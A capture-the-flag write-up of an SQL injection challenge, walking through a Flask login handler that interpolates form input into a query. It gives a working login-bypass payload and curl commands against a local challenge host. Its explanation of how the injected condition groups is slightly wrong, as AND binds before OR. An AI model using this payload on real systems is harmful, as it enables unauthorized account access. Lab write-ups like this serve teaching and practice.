# SQLi2

## Challenge Description

### Challenge Overview

We are provided with a login page located at:

```
POST /gateway
```

To solve this challenge, our goal is to log in as the admin user to retrieve the flag, which is only revealed to users who are logged in with `username == "admin"`.

## Source code Analysis

```python
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
db.execute("""INSERT INTO users SELECT "guest" as username, 'password' as password""")
```

### Database Initialization

The database is initialized with two users:

* `admin` with a random password `(os.urandom(8))`.

* `guest` with a known password `"password"`.

### Login Logic

The vulnerable code appears in the /gateway POST handler:

```python
username = flask.request.form.get("userid")
password = flask.request.form.get("pword")
...
query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
user = db.execute(query).fetchone()
```

This line is vulnerable to SQL injection because user input is directly interpolated into the SQL query string without sanitization or parameterization.

## Vulnerability

The vulnerable query:

```SQL
SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{password}'
```

### Our Goal

We want this query to return the `admin` row regardless of what the random password is.

To do this, we can inject into the pword parameter so that:

The username is `admin` (a valid user).

The password check is bypassed using `OR 1=1`.

## Exploitation

### Step 1: Crafting the Injection Payload

We set the username to `admin`, and inject into the password field with:

```SQL
123 ' or 1=1 --
```

This results in the following SQL query:

```SQL
SELECT rowid, * FROM users WHERE username = 'admin' AND password = '123 ' or 1=1 --'
```
Here’s what happens:

The password condition is bypassed:

`'123 ' or 1=1` is always true.

The rest of the query is commented out using `--`, avoiding any syntax errors.

The query becomes effectively:

```SQL
SELECT rowid, * FROM users WHERE username = 'admin' AND (true)
```

Which successfully returns the admin row, logging us in.

### Step 2: Commands Used

```SHELL
curl -c cookies.txt -X POST "http://challenge.localhost:80/gateway" -d "userid=admin" -d "pword=123 ' or 1=1 --"
curl -b cookies.txt http://challenge.localhost:80/gateway
```

* The first command logs us in as `admin`.

* The second command uses the session cookie to access the flag.